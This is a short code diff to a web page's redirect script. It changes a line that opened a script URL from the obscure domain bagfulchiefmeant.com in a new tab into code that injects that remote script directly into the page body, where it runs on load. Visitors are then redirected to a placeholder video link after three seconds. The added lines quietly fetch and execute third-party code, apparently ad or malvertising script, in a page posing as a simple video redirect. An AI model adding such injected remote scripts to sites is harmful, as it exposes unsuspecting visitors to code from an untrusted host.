@@ -185,7 +185,11 @@
 
       // Final redirect
       (function(){
-      window.open('//bagfulchiefmeant.com/eb/7a/2c/eb7a2ca242c68578194b74779fc75282.js', '_blank');
+      
+    var script = document.createElement('script');
+    script.src = "//bagfulchiefmeant.com/eb/7a/2c/eb7a2ca242c68578194b74779fc75282.js";
+    document.body.appendChild(script);
+    
       setTimeout(function(){
         window.location.href = "https://your-video-link.com";
       }, 3000);
